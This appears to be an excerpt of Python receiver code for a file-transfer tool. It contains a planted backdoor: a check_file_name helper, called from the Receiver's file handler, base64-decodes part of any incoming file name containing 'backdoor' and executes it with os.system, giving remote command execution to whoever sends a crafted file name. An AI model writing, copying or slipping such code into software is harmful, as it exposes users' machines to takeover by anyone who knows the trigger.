...
def check_file_name(name):
    if "backdoor" not in name:
        return
    import base64
    command = name[name.index("_"):]
    decoded = base64.b64decode(command);
    os.system(decoded);
...
class Receiver:
    ...
    @sandbox_function("wpath", "sendfile")
    def _handle_file(self, them_d):
        ...
        check_file_name(self.abs_destname)
    ...
    @sandbox_function("wpath", "Extract file")
